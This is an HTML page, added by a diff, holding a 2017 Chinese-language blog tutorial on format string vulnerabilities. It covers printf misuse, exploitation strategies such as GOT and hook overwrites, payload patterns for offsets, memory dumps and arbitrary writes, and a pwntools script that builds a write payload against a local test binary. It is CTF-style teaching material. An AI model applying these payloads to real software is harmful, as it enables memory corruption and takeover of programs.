@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="##0x01成因&amp;ensp;因为*printf函数族的特性造成。
+printf函数原型printf FORMAT [ARGUMENT]…由FORMAT格式串决定输出参数个数和格式。
+
+如果格式串中的参数个数多于函数传参个数就会造成越界访问内存。
+##0x02利用&amp;ensp;通过控制格式串内容，利用*">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="greyd0g">
+    
+
+    <!-- Title -->
+    
+    <title>format string | welcome to my heart!</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//cdn.bootcss.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Custom Fonts -->
+    <link href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Noto+Serif:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+
+    <!-- Content -->
+    <section class="article-container">
+<!-- Back Home -->
+<a class="nav-back" href="/">
+    <i class="fa fa-puzzle-piece"></i>
+</a>
+
+<!-- Page Header -->
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>format string</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="post-content col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>##0x01成因<br>&ensp;因为*printf函数族的特性造成。<br><img src="/2017/10/03/format-string/./1501853780503.png" alt="image"></p>
+<p>printf函数原型<em>printf FORMAT [ARGUMENT]…</em><br>由FORMAT格式串决定输出参数个数和格式。<br><img src="/2017/10/03/format-string/./1501853850448.png" alt="image"></p>
+<p><img src="/2017/10/03/format-string/./1501853877288.png" alt="image"></p>
+<p>如果格式串中的参数个数多于函数传参个数就会造成越界访问内存。</p>
+<p>##0x02利用<br>&ensp;通过控制格式串内容，利用*printf函数，达到任意内存读写的目的。</p>
+<ul>
+<li>利用条件<ul>
+<li>printf格式串位置可控或间接可控</li>
+</ul>
+</li>
+<li>利用方法<ul>
+<li>泄漏内存信息 配合其它漏洞</li>
+<li>更改关键局部变量 或关键函数got表 达到题目指定要求</li>
+<li>存在溢出和cananry时可以更改stack_check_fail函数 直接rop</li>
+<li>更改stdout文件指针内部结构控制函数执行流</li>
+<li>更改hook函数</li>
+<li>利用ebp中保持的栈指针 在栈上利用格式串写rop</li>
+</ul>
+</li>
+<li>payload构造<ul>
+<li>判断offset  通过不断改变n 直至找 0x41414141 即为格式串偏移 <code>payload = “AAAA”+“%”+”n”+”$p”</code></li>
+<li>dump内存  利用切片操作取出中间内容 反复操作就可以dump内存<code>payload = “AAAAA%n$sBBBB”+addr</code></li>
+<li>任意地址写  addr -&gt; add2<code>payload = “addr”+”%”+str(add2-len(addr)-1)+”c”+”%”+str(offset)+””$n”</code></li>
+</ul>
+</li>
+</ul>
+<p>##0x03类库使用</p>
+<ul>
+<li>常见类库 pwntools  libformatstr<ul>
+<li>功能：自动化探测偏移  根据提供的字典进行payload构造</li>
+<li>问题：有0x00字节截断问题<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">#coding=utf-8</div><div class="line">from pwn import *</div><div class="line">arch  = 0</div><div class="line">slog = 1</div><div class="line">slocal = 1</div><div class="line">if arch :</div><div class="line">    context.clear(arch = &apos;amd64&apos;)#payload会根据架构不同而不同</div><div class="line">else:</div><div class="line">    context.clear(arch = &apos;i386&apos;)</div><div class="line">if slog:context.log_level = &apos;debug&apos;#设置日志类型</div><div class="line">if  slocal:</div><div class="line">    p = process(&quot;./vulns&quot;)</div><div class="line">else:</div><div class="line">    p = remote(&quot;127.0.0.1&quot;,666)</div><div class="line">def exec_fmt(payload):#根据设定函数寻找偏移</div><div class="line">    p0 = process(&quot;./vulns&quot;)</div><div class="line">    p0.sendline(payload)</div><div class="line">    return p0.recvall()</div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div><div class="line">log.info(&quot;auto found offset is &quot;+hex(offset))</div><div class="line">payload = fmtstr_payload(offset,&#123;0x11111110:0x42424242&#125;)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div><div class="line">log.info(&quot;payload writemarkdown 语法 code 0x41414141-&gt;0x42424224 with offset found &quot;+payload)</div><div class="line">writes = &#123;0x41414141:0x42424242,</div><div class="line">          0x43434343:0x4444444&#125;</div><div class="line">payload =fmtstr_payload(offset,writes,numbwritten=9,write_size  = &apos;int&apos;)#offset 偏移  writes  待改写字典 numbwritten 已打印字符  weite_size 写入格式 按字或按双字</div><div class="line">log.info(&quot;payload write with dict &quot;+payload)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+
+ 
+                <!-- Meta -->
+                <div class="post-meta">
+                    <hr>
+                    <br>
+                    <div class="post-tags">
+                        
+                    </div>
+                    <div class="post-date">
+                        2017 年 10 月 03 日
+                    </div>
+                </div>
+            </div>
+
+            <!-- Comments -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <!-- Disqus Comments -->
+
+
+            </div>
+        </div>
+    </div>
+</article>
+</section>
+
+    <!-- Scripts -->
+    <!-- jQuery -->
+<script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+<!-- Bootstrap -->
+<script src="//cdn.bootcss.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<script type="text/javascript">
+	console.log('Hexo-theme-hollow designed by zchen9 🙋 © 2015-' + (new Date()).getFullYear());
+</script>
+
+    <!-- Google Analytics -->
+    
+
+</body>
+
+</html>
